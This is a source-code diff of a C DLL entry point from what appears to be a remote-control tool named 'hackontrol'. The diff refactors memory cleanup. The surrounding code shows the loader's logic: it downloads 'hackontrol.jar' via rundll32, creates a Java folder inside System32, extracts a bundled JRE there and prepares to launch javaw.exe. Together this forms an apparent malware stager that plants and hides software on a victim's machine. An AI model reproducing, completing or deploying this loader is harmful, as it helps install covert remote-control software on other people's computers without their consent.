@@ -1,5 +1,4 @@
-#include <khopanwindows.h>
-#include <khopanerror.h>
+#include <khopanwin32.h>
 #include <khopanstring.h>
 #include "downloadjar.h"
 #include "extractor.h"
@@ -15,7 +14,7 @@
 #define REMOTE_FILE_NAME L"hackontrol.jar"
 
 __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
-	LPWSTR windowsDirectoryPath = KHGetWindowsDirectoryW();
+	LPWSTR windowsDirectoryPath = KHWin32GetWindowsDirectoryW();
 
 	if(!windowsDirectoryPath) {
 		KHWin32DialogErrorW(GetLastError(), L"KHGetWindowsDirectoryW");
@@ -23,10 +22,10 @@ __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LP
 	}
 	
 	LPWSTR system32Path = KHFormatMessageW(L"%ws\\" SYSTEM32, windowsDirectoryPath);
+	FREE(windowsDirectoryPath);
 
 	if(!system32Path) {
 		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
-		FREE(windowsDirectoryPath);
 		return;
 	}
 
@@ -44,15 +43,18 @@ __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LP
 		goto freeRundll32Path;
 	}
 
-	if(DownloadJar(system32Path, rundll32Path, downloadArgument)) {
-		goto freeDownloadArgument;
+	BOOL result = DownloadJar(system32Path, rundll32Path, downloadArgument);
+	FREE(downloadArgument);
+
+	if(!result) {
+		goto freeRundll32Path;
 	}
 
 	LPSTR javaDirectoryPath = KHFormatMessageA("%ws\\" JAVA_PATH_NAME, system32Path);
 
 	if(!javaDirectoryPath) {
 		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
-		goto freeDownloadArgument;
+		goto freeRundll32Path;
 	}
 
 	if(!CreateDirectoryA(javaDirectoryPath, NULL)) {
@@ -60,19 +62,23 @@ __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LP
 
 		if(error != ERROR_ALREADY_EXISTS) {
 			KHWin32DialogErrorW(error, L"KHFormatMessageW");
-			goto freeJavaDirectoryPath;
+			FREE(javaDirectoryPath);
+			goto freeRundll32Path;
 		}
 	}
 
-	if(ExtractJRE(javaDirectoryPath)) {
-		goto freeJavaDirectoryPath;
+	result = ExtractJRE(javaDirectoryPath);
+	FREE(javaDirectoryPath);
+
+	if(result) {
+		goto freeRundll32Path;
 	}
 
 	LPWSTR javaBinPath = KHFormatMessageW(L"%ws\\%S\\bin", system32Path, JAVA_PATH_NAME);
 
 	if(!javaBinPath) {
 		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
-		goto freeJavaDirectoryPath;
+		goto freeRundll32Path;
 	}
 
 	LPWSTR javaExecutablePath = KHFormatMessageW(L"%ws\\javaw.exe", javaBinPath);
@@ -95,10 +101,6 @@ freeJavaExecutablePath:
 	FREE(javaExecutablePath);
 freeJavaBinPath:
 	FREE(javaBinPath);
-freeJavaDirectoryPath:
-	FREE(javaDirectoryPath);
-freeDownloadArgument:
-	FREE(downloadArgument);
 freeRundll32Path:
 	FREE(rundll32Path);
 freeSystem32Path:
